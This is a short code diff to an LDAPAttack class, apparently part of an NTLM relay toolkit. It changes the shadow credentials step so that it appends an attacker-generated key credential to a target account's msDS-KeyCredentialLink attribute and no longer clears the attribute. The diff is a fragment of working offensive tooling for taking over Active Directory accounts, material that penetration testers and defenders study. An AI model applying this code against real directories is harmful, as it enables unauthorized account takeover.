@@ -242,6 +242,7 @@ class LDAPAttack(ProtocolAttack):
         if self.config.ShadowCredentialsTarget in delegatePerformed:
             LOG.info('Shadow credentials attack already performed for %s, skipping' % self.config.ShadowCredentialsTarget)
             return
+        
         # If the target is not specify, we try to modify the user himself
         if not self.config.ShadowCredentialsTarget:
             self.config.ShadowCredentialsTarget = self.username
@@ -281,8 +282,10 @@ class LDAPAttack(ProtocolAttack):
         try:
             new_values = results['raw_attributes']['msDS-KeyCredentialLink'] + [keyCredential.toDNWithBinary().toString()]
             LOG.info("Updating the msDS-KeyCredentialLink attribute of %s" % self.config.ShadowCredentialsTarget)
-            # self.client.modify(target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]})
-            self.ldap_session.modify(target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, []]})
+            
+            #TODO: debug this to findout where/what is the value if populated and save it to disk for restore 
+            # self.client.modify(target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, []]}) # Clear Attribute if populated
+            self.client.modify(target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]})
 
             if self.client.result['result'] == 0:
                 LOG.info("Updated the msDS-KeyCredentialLink attribute of the target object")
